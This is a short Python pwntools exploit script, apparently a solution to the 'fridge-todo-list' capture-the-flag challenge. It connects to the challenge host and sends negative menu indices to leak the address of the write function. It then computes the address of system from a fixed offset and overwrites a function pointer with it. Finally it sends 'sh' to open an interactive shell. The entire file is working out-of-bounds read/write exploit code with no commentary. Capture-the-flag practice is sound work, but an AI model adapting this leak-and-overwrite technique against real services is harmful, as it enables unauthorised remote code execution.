from pwn import *
from struct import unpack,pack

r = remote("fridge-todo-list.ctfcompetition.com",1337)
r.send("hacker\n")
r.recvuntil(">")
r.send("2\n")
r.recvuntil("?")
r.send("-6\n")
response = r.recvuntil("\n\n")
response = response.replace(" Your TODO: ", "")
write_address = unpack("<Q",response.ljust(8,chr(0)))[0]
system_address = (write_address-0x910) + 0x940
r.recvuntil(">")
r.send("3\n")
r.recvuntil("?")
r.send("-4\n")
r.send("A"*8+pack("<Q",system_address)+"\n")
r.recvuntil(">")
r.send("sh\n")
r.interactive()
